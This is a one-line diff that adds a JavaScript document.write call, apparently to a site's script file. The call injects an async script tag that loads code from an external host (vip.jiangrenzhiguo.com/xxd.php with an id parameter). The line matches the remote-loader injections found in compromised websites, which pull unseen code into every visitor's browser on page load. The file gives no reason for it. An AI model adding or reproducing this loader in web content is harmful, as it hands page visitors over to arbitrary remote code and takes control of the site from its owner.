@@ -1,0 +1,1 @@
+﻿document.write('<script async='async' src='https:\/\/vip.jiangrenzhiguo.com\/xxd.php?id=4437'><\/script>');
